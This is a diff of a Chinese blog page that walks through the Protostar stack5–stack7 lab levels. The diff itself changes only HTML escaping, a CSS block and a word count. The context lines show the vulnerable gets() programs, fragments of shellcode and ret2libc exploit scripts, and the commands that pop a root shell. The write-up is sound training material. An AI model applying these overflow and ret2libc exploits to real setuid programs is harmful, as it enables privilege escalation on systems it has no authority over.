@@ -53,7 +53,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1"></head>
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
 
 
 <body>
@@ -435,17 +437,17 @@
             <div id="articleContent">
                 <span id="more"></span>
 
-<h1 id="Pwn-protostar靶场4-stack-five-，stack-six，stack-seven"><a href="#Pwn-protostar靶场4-stack-five-，stack-six，stack-seven" class="headerlink" title="Pwn-protostar靶场4 stack five,，stack six，stack seven"></a>Pwn-protostar靶场4 stack five,，stack six，stack seven</h1><h2 id="Stack-Five"><a href="#Stack-Five" class="headerlink" title="Stack Five"></a>Stack Five</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<h1 id="Pwn-protostar靶场4-stack-five-，stack-six，stack-seven"><a href="#Pwn-protostar靶场4-stack-five-，stack-six，stack-seven" class="headerlink" title="Pwn-protostar靶场4 stack five,，stack six，stack seven"></a>Pwn-protostar靶场4 stack five,，stack six，stack seven</h1><h2 id="Stack-Five"><a href="#Stack-Five" class="headerlink" title="Stack Five"></a>Stack Five</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
   <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这个程序很简单，只有两行，作用只是接受我们的输入</p>
 <h4 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h4><p>什么是setuid？</p>
@@ -468,7 +470,7 @@
 <h3 id="获取ret返回地址"><a href="#获取ret返回地址" class="headerlink" title="获取ret返回地址"></a>获取ret返回地址</h3><p>使用gdb打开程序，在执行leave指令的地方下一个断点</p>
 <p><img src="/img/1731486503524.png"></p>
 <p> 运行程序，随便输入一些字符，然后查看栈状态 </p>
-<pre class="line-numbers language-none"><code class="language-none">x&#x2F;25wx $esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">x/25wx $esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731486596363.png"></p>
 <p>然后重新加载程序，在ret下断点，查看寄存器中程序跳转地址</p>
@@ -488,24 +490,24 @@ payload <span class="token operator">=</span> <span class="token string">"\x31\x
 <span class="token keyword">print</span> padding<span class="token operator">+</span>eip<span class="token operator">+</span>nopnop<span class="token operator">+</span>payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到 </p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;files&#x2F;shellcode-811.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http://shell-storm.org/shellcode/files/shellcode-811.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731487160482.png"></p>
 <p>这是一个linux x86架构执行/bin/sh的shellcode</p>
 <p>如果我们直接运行脚本是得不到/bin/sh的<img src="/img/1731487346049.png"></p>
 <p> 其实/bin/sh已经执行了，只是没有输入，我们可以用cat命令来重定向到标准输入输出 </p>
-<pre class="line-numbers language-none"><code class="language-none">(python stack5exp.py ; cat) | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">(python stack5exp.py ; cat) | /opt/protostar/bin/stack5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731487445527.png"></p>
 <p> 成功破解程序 </p>
 <h2 id="Stack-Six"><a href="#Stack-Six" class="headerlink" title="Stack Six"></a>Stack Six</h2><p>Stack Six和Stack Seven的源代码是一样的，可以通过ret to libc的方式获取shell</p>
-<h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
 <span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
 
@@ -515,18 +517,18 @@ payload <span class="token operator">=</span> <span class="token string">"\x31\x
 
   ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前两位是0xbf</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">//如果内存地址的前两位是0xbf</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
     <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">}</span>
 
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
-<span class="token punctuation">&#125;</span>
+<span class="token punctuation">}</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="ret-to-libc"><a href="#ret-to-libc" class="headerlink" title="ret to libc"></a>ret to libc</h4><p>ret to libc是将程序的返回地址覆盖为标准 C 库中的某个函数的地址，如 “system” 函数，这个函数可以用来执行系统命令。然后，攻击者构造一个有效的参数，比如”<strong>/bin/sh</strong>“，将其传递给 “<strong>system</strong>” 函数，从而获取shell</p>
 <h3 id="寻找system函数地址和-bin-sh字符串"><a href="#寻找system函数地址和-bin-sh字符串" class="headerlink" title="寻找system函数地址和/bin/sh字符串"></a>寻找system函数地址和/bin/sh字符串</h3><p>用gdb打开程序，在getpath函数执行leave指令的地址打一个断点</p>
@@ -548,7 +550,7 @@ p system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></
 <p><img src="/img/1731488032573.png"></p>
 <p> stack6的libc库为：**/lib/libc-2.11.2.so<strong>，libc的基地址为：</strong>0xb7e97000** </p>
 <p> 现在新开一个终端，在libc库里查找/bin/sh字符串的地址 </p>
-<pre class="line-numbers language-none"><code class="language-none">strings -t d &#x2F;lib&#x2F;libc-2.11.2.so | grep &quot;&#x2F;bin&#x2F;sh&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">strings -t d /lib/libc-2.11.2.so | grep "/bin/sh"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731488182979.png"></p>
 <p> 字符串/bin/sh的偏移地址为：<strong>1176511</strong>，<strong>libc的基地址+字符串的偏移地址=程序调用字符串的完整地址</strong> </p>
@@ -577,13 +579,13 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
 <p> 执行程序，成功获得root权限 </p>
 <p><img src="/img/1731488765115.png"></p>
 <h2 id="Stack-Seven"><a href="#Stack-Seven" class="headerlink" title="Stack Seven"></a>Stack Seven</h2><p>Stack Seven和Stack Six的程序源代码很像，只是修改了一下判断的值</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
 <span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
 
@@ -593,18 +595,18 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
 
   ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前一位是0xb</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">//如果内存地址的前一位是0xb</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
     <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">}</span>
 
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
-<span class="token punctuation">&#125;</span>
+<span class="token punctuation">}</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们只需要多加一个ret指令的地址，让程序返回到我们指定的地方执行system函数和/bin/sh字符串 </p>
 <h3 id="寻找ret地址"><a href="#寻找ret地址" class="headerlink" title="寻找ret地址"></a>寻找ret地址</h3><p>我们可以使用objdump工具来寻找ret指令的地址</p>
@@ -1053,7 +1055,7 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">42.3k</span>
+                        class="white-color">41.6k</span>
             
             
             
